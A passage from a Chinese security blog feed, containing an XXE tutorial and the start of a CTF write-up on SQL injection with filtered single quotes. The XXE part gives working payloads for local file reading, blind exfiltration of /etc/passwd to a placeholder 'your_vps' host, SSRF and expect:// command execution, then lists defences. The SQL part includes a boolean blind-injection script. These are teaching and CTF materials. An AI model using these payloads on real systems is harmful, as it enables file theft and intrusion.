<p>引用实体的方式：<code>&amp;实体名;</code></p>
<p><strong>a. 内部一般实体声明：</strong></p>
<p>语法：</p>
<figure class="highlight vhdl"><table><tr><td class="code"><pre><span class="line">&lt;!<span class="keyword">ENTITY</span> <span class="keyword">entity</span>-name <span class="string">"entity-value"</span>&gt;</span><br></pre></td></tr></table></figure>
<p>实例：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE author[</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY writer "Donald Duck."&gt;</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY copyright "Copyright runoob.com"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span>&amp;writer;&amp;copyright;<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>b. 外部一般实体声明</strong></p>
<p>语法：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY entity-name<span class="built_in"> SYSTEM </span><span class="string">"URI/URL"</span>&gt;</span><br></pre></td></tr></table></figure>
<p>实例：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE author[</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY writer SYSTEM "http://www.runoob.com/entities.dtd"&gt;</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY copyright SYSTEM "http://www.runoob.com/entities.dtd"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span>&amp;writer;&amp;copyright;<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>（2）参数实体的声明格式：</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % 实体名 "实体内容"&gt;</span></span><br></pre></td></tr></table></figure>
<p>引用实体的方式：<code>%实体名;</code></p>
<p><strong>a. 内部参数实体</strong></p>
<p>参数实体不能被应用在元素的声明当中，不能使用参数实体来定义元素，只有在外部DTD中参数实体才能被应用到元素的声明当中。</p>
<p>test.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE person SYSTEM "test323.dtd"&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">person</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Jason<span class="tag">&lt;/<span class="name">name</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">addr</span>&gt;</span>Shanghai<span class="tag">&lt;/<span class="name">addr</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">tel</span>&gt;</span>18701772821<span class="tag">&lt;/<span class="name">tel</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>/&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">email</span>&gt;</span>18701772821@163.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">person</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>test.dtd</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">person</span> (<span class="attr">name</span>,<span class="attr">addr</span>,<span class="attr">tel</span>,<span class="attr">br</span>,<span class="attr">email</span>)&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> %<span class="attr">name</span> "(#<span class="attr">PCDATA</span>)"&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">addr</span> %<span class="attr">name</span>;&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">tel</span> %<span class="attr">name</span>;&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">br</span> <span class="attr">EMPTY</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">email</span> %<span class="attr">name</span>;&gt;</span></span><br></pre></td></tr></table></figure>
<p>参数实体必须先定义再使用，而不能像一般实体那样随意放置。</p>
<p><strong>b. 外部参数实体</strong></p>
<p>能将原来很长的DTD文档转变成一个很小的、相互调用的文档集合，适合大型DTD文档的设计开发。</p>
<p>test.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE person [  </span></span><br><span class="line"><span class="meta">&lt;!ELEMENT person (name,addr,tel,br,email)&gt;  </span></span><br><span class="line"><span class="meta">&lt;!ENTITY % （注意这里有个空格）content SYSTEM "test323.dtd"&gt;  </span></span><br><span class="line"><span class="meta">%content;  </span></span><br><span class="line"><span class="meta">]&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">person</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Jason<span class="tag">&lt;/<span class="name">name</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">addr</span>&gt;</span>Shanghai<span class="tag">&lt;/<span class="name">addr</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">tel</span>&gt;</span>18701772821<span class="tag">&lt;/<span class="name">tel</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>/&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">email</span>&gt;</span>18701772821@163.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">person</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>test.dtd</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">name</span> (#<span class="attr">PCDATA</span>)&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">addr</span> (#<span class="attr">PCDATA</span>)&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">tel</span> (#<span class="attr">PCDATA</span>)&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">br</span> <span class="attr">EMPTY</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">email</span> (#<span class="attr">PCDATA</span>)&gt;</span></span><br></pre></td></tr></table></figure>
<p><br></p>
<h3 id="0x02-漏洞原因"><a href="#0x02-漏洞原因" class="headerlink" title="0x02 漏洞原因"></a>0x02 漏洞原因</h3><p>解析xml文件时允许加载外部实体，没有过滤用户提交的参数。</p>
<p>造成的危害有：</p>
<ul>
<li><p>读取任意文件</p>
</li>
<li><p>执行系统命令</p>
</li>
<li><p>探查内网端口</p>
</li>
<li><p>攻击内网网站</p>
</li>
</ul>
<p><br></p>
<h3 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h3><p><br></p>
<p>关于XXE更多利用方式可参考: <a href="https://xz.aliyun.com/t/3357" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357</a></p>
<h5 id="一、读取本地文件（有回显）"><a href="#一、读取本地文件（有回显）" class="headerlink" title="一、读取本地文件（有回显）"></a>一、读取本地文件（有回显）</h5><p><strong>（1）利用xml外部实体</strong></p>
<p>如index.php内容如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  $xml=simplexml_load_string($_GET[<span class="string">'xml'</span>]);</span><br><span class="line">  print_r((string)$xml);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>利用payload为：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY file SYSTEM "file:///E:/test.txt"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">note</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">note</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>将上面的payload进行url编码后既可以读到本地文件。</p>
<p><strong>（2）xml引用外部实体(引用DTD文件)</strong></p>
<p>还是上面的例子，payload如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"> <span class="meta">&lt;!DOCTYPE note [&lt;!ENTITY % a SYSTEM "http://your_vps/test.dtd"&gt; %a;]&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">note</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>在你的服务器上创建dtd文件如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">file</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">E:</span>/<span class="attr">test.txt</span>"&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>（3）base64读取php/html等文件</strong></p>
<p>如果要读取php文件，因为php、html等文件中有各种括号&lt;，&gt;，若直接用file读取会导致解析错误，此时可以利用php://filter将内容转换为base64后再读取。</p>
<p>payload如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encodeing="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><br></p>
<h5 id="二、Blind-XXE（无回显）"><a href="#二、Blind-XXE（无回显）" class="headerlink" title="二、Blind XXE（无回显）"></a>二、Blind XXE（无回显）</h5><p>对于无回显的xml注入，则使用如下<strong>Blind XXE</strong>方法，即使用嵌套形式，利用外部实体中的URL发出访问，从而跟攻击者的服务器发生联系。</p>
<p>可以在你的vps上放xxe.dtd文件如下(send前面的是<code>%</code>的实体编码<code>&amp;#37;</code>):</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">file</span> <span class="attr">SYSTEM</span> "<span class="attr">php:</span>//<span class="attr">filter</span>/<span class="attr">read</span>=<span class="string">convert.base64-encode/resource</span>=<span class="string">file:///etc/passwd</span>"&gt;</span></span><br><span class="line">&lt;!ENTITY % all "&lt;!ENTITY &amp;#37; send SYSTEM 'http://your_vps:1234?file=%file;'&gt;"&gt;</span><br></pre></td></tr></table></figure>
<p>使用的payload如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % remote SYSTEM "http://your_vps/xxe.dtd"&gt;</span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%all;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后监听1234端口并提交payload：<br><img src="/2019/08/15/XML实体注入攻击/2020032820023160.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h5 id="三、SSRF-内网探测"><a href="#三、SSRF-内网探测" class="headerlink" title="三、SSRF/内网探测"></a>三、SSRF/内网探测</h5><p>由于xml实体注入攻击可以利用<code>http://</code>协议，也就是可以发起http请求。可以利用该请求去探查内网，进行SSRF攻击。</p>
<p><strong>（1）探测内网端口</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT name ANY&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "http://127.0.0.1:80"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="meta">&lt;root&gt;</span></span><br><span class="line"><span class="meta">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span></span><br><span class="line"><span class="meta">&lt;/root&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>（2）攻击内网网站</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT name ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "http://127.0.0.1:80/payload" &gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><br></p>
<h5 id="四、命令执行"><a href="#四、命令执行" class="headerlink" title="四、命令执行"></a>四、命令执行</h5><p>在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令</p>
<p>payload:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT name ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "expect://id" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><br></p>
<h5 id="五、利用本地dtd文件报错回显"><a href="#五、利用本地dtd文件报错回显" class="headerlink" title="五、利用本地dtd文件报错回显"></a>五、利用本地dtd文件报错回显</h5><p>当你有一个支持外部实体的XXE，但服务器的响应始终为空，这样情况就需要Blind XXE，但是如果你和目标服务器之间有防火墙，一般的利用vps外带数据的方法就不能用了。</p>
<p>首先要知道，外部DTD允许我们在第二个实体中包含一个实体，但它在内部DTD中是被禁止的。</p>
<p>所以要想在内部DTD子集中使用外部DTD语法，你可以在目标主机上强制执行本地dtd文件，并在其中重新定义一些参数实体引用：</p>
<p>Payload:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE message [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % local_dtd SYSTEM "file:///opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd"&gt;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % condition 'aaa)&gt;</span></span><br><span class="line"><span class="meta">        &lt;!ENTITY &amp;#x25; file SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">        &lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;"&gt;</span></span><br><span class="line"><span class="meta">        &amp;#x25;eval;</span></span><br><span class="line"><span class="meta">        &amp;#x25;error;</span></span><br><span class="line"><span class="meta">        &lt;!ELEMENT aa (bb'&gt;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    %local_dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>any text<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>sip-app_1_0.dtd 中的内容</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">condition</span> "<span class="attr">and</span> | <span class="attr">or</span> | <span class="attr">not</span> | <span class="attr">equal</span> | <span class="attr">contains</span> | <span class="attr">exists</span> | <span class="attr">subdomain-of</span>"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">pattern</span> (%<span class="attr">condition</span>;)&gt;</span></span><br></pre></td></tr></table></figure>
<p>它起作用是因为所有XML实体都是常量，如果定义两个具有相同名称的实体则仅使用第一个实体。</p>
<p><strong>Linux</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">local_dtd</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">usr</span>/<span class="attr">share</span>/<span class="attr">yelp</span>/<span class="attr">dtd</span>/<span class="attr">docbookx.dtd</span>"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">ISOamsa</span> '<span class="attr">Your</span> <span class="attr">DTD</span> <span class="attr">code</span>'&gt;</span></span><br><span class="line">%local_dtd;</span><br></pre></td></tr></table></figure>
<p><strong>Windows</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">local_dtd</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">C:</span>\<span class="attr">Windows</span>\<span class="attr">System32</span>\<span class="attr">wbem</span>\<span class="attr">xml</span>\<span class="attr">cim20.dtd</span>"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">SuperClass</span> '&gt;</span>Your DTD code<span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">test</span> "<span class="attr">test</span>"'&gt;</span></span><br><span class="line">%local_dtd;</span><br></pre></td></tr></table></figure>
<p><br></p>
<h3 id="0x04-判断XXE漏洞"><a href="#0x04-判断XXE漏洞" class="headerlink" title="0x04 判断XXE漏洞"></a>0x04 判断XXE漏洞</h3><p><br></p>
<h5 id="一、XML是否被解析"><a href="#一、XML是否被解析" class="headerlink" title="一、XML是否被解析"></a>一、XML是否被解析</h5><p>尝试提交测试payload：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;</span>   </span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY [       </span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe 'hava a xxe'&gt;  </span></span><br><span class="line"><span class="meta">]&gt;</span>    </span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>看<code>&amp;xxe;</code>是否会变成<code>hava a xxe</code></p>
<h5 id="二、是否支持外部实体"><a href="#二、是否支持外部实体" class="headerlink" title="二、是否支持外部实体"></a>二、是否支持外部实体</h5><p>测试payload:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY [  </span></span><br><span class="line"><span class="meta">&lt;!ENTITY % xxe SYSTEM “http://your_vps/test.xml”&gt;  </span></span><br><span class="line"><span class="meta">%xxe;  </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
<p>通过查看自己服务器上的日志来，如果目标服务器是否向你的服务器发了一条请求test.xml的HTTP请求，则说明目标服务器支持外部实体。</p>
<h5 id="三、是否能够回显"><a href="#三、是否能够回显" class="headerlink" title="三、是否能够回显"></a>三、是否能够回显</h5><p>如果上面两步都支持，就看是否回显。</p>
<ul>
<li><p>如果能回显就直接引用外部实体注入。</p>
</li>
<li><p>有时候服务器会不支持一般实体的引用，也就是在DTD之外无法引用实体，如果这样的话，只能使用Blind XXE攻击。</p>
</li>
</ul>
<p><br></p>
<h3 id="0x05-防御XXE"><a href="#0x05-防御XXE" class="headerlink" title="0x05 防御XXE"></a>0x05 防御XXE</h3><p><br></p>
<h5 id="一、禁用外部实体"><a href="#一、禁用外部实体" class="headerlink" title="一、禁用外部实体"></a>一、禁用外部实体</h5><p><strong>（1）PHP</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">libxml_disable_entity_loader(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure>
<p><strong>（2）Python</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure>
<p><strong>（3）Java</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(<span class="keyword">false</span>);</span><br></pre></td></tr></table></figure>
<p><br></p>
<h5 id="二、过滤用户提交的XML数据"><a href="#二、过滤用户提交的XML数据" class="headerlink" title="二、过滤用户提交的XML数据"></a>二、过滤用户提交的XML数据</h5><p>过滤关键词：<code>&lt;!DOCTYPE和&lt;!ENTITY</code>或者<code>SYSTEM和PUBLIC</code>等。</p>
<p><br></p>
<p><br></p>
<p><br></p>
<p>参考链接：<br><a href="https://www.smi1e.top/dsada/#XML" target="_blank" rel="noopener">https://www.smi1e.top/dsada/#XML</a></p>
<p><a href="https://skysec.top/2017/08/18/xml%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">https://skysec.top/2017/08/18/xml%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/</a></p>
]]></content>
      <categories>
        <category>System Security</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>通过两道CTF题学习过滤单引号的SQL注入</title>
    <url>/2020/03/24/bypass-apostrophe-ctf-sqli-learn/</url>
    <content><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>通常来说，在进行字符型的SQL注入时，都需要先将前面的引号等（以单引号为例）进行闭合才能执行我们构造的SQL语句，那么如果单引号被过滤了，是否还能够成功的SQL注入呢？</p>
<p>答案是可以，当你在判断登录时使用的是如下SQL语句：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">user</span>=<span class="string">'$_POST[username]'</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">'$_POST[password]'</span>;</span><br></pre></td></tr></table></figure></p>
<p>那么即使在过滤的时候将单引号过滤掉了，还是可以进行一定程度上的注入的，下面通过两道CTF题来进行介绍。</p>
<p><br></p>
<h3 id="0x01-BJDCTF-2020-简单注入"><a href="#0x01-BJDCTF-2020-简单注入" class="headerlink" title="0x01 [BJDCTF 2020]简单注入"></a>0x01 [BJDCTF 2020]简单注入</h3><p>进入题目后就是一个登录框，名字也提示了要注入：<br><img src="/2020/03/24/bypass-apostrophe-ctf-sqli-learn/20200324000045489.png" alt="在这里插入图片描述"><br>扫描目录发现hint.txt中的提示：</p>
<p><img src="/2020/03/24/bypass-apostrophe-ctf-sqli-learn/20200324000146668.png" alt="在这里插入图片描述"></p>
<p>告诉了我们登录的sql语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">'$_POST["username"]'</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">'$_POST["password"]'</span>;</span><br></pre></td></tr></table></figure>
<p>稍微fuzz一下可以发现过滤了<code>&#39;</code>、<code>&quot;</code>、<code>=</code>、<code>-</code>、<code>and</code>、<code>select</code>等关键词，其中关键就是这个单引号，由hint已知这里是需要单引号进行闭合的，而单引号又被过滤了。</p>
<p>可以发现注释符<code>#</code>和反斜杠<code>\</code>并没有被过滤，既然注释符没有过滤，那么我们就可以注释掉最后一个单引号，这样就只剩下3个单引号需要处理。</p>
<p>而如果我们输入的用户名以反斜杠<code>\</code>结尾，例如POST：<code>username=admin\&amp;password=123456#</code>，那么拼接进去后，<code>\</code>就可以将第2个单引号转义掉，如下：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">'admin\' and password='</span><span class="number">123456</span><span class="comment">#';</span></span><br></pre></td></tr></table></figure></p>
<p>这样第1个单引号就会找第3个单引号进行闭合，后台接收到的username实际上是<code>admin\&#39; and password=</code>这个整体，而这个用户名显然不存在，所以还是登录失败。</p>
<p>但是别忘了我们还有一个password变量可控，实际上我们已经解决了单引号的闭合问题了，下面的就是常规的思路，比如我们构造password为<code>or 2&gt;1#</code></p>
<p>那么拼接后的sql语句就为：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">'admin\' and password='</span> <span class="keyword">or</span> <span class="number">2</span>&gt;<span class="number">1</span><span class="comment">#';</span></span><br></pre></td></tr></table></figure></p>
<p>很显然上面的语句会返回为真，通过这样的思路，我们就可以进行bool盲注：</p>
<p><img src="/2020/03/24/bypass-apostrophe-ctf-sqli-learn/20200324003015750.png" alt="在这里插入图片描述"></p>
<p><img src="/2020/03/24/bypass-apostrophe-ctf-sqli-learn/20200324003039966.png" alt="在这里插入图片描述"></p>
<p>最终脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">url = <span class="string">'http://6644a23a-145c-40a9-a969-90ff1f80ac4d.node3.buuoj.cn/'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(i, j)</span>:</span></span><br><span class="line">    payload = <span class="string">f"or (ascii(substr(password,<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;j&#125;</span>)#"</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">"username"</span>: <span class="string">"admin\\"</span>,</span><br><span class="line">        <span class="string">"password"</span>: payload</span><br><span class="line">    &#125;</span><br><span class="line">    r = s.post(url, data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"BJD needs to be stronger"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    low = <span class="number">32</span> </span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> (low &lt;= high):</span><br><span class="line">        mid = (low + high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> (exp(i, mid)):</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid - <span class="number">1</span></span><br><span class="line">    flag += chr((low+high+<span class="number">1</span>)//<span class="number">2</span>)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>
<p>运行脚本得到admin的密码：OhyOuFOuNdit，登录即可得到flag。<br><img src="/2020/03/24/bypass-apostrophe-ctf-sqli-learn/2020032400321152.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h3 id="0x02-某道CTF入群题"><a href="#0x02-某道CTF入群题" class="headerlink" title="0x02 某道CTF入群题"></a>0x02 某道CTF入群题</h3><p>同样也是一到登陆题，在<code>check.php</code>中给出了源码如下：</p>
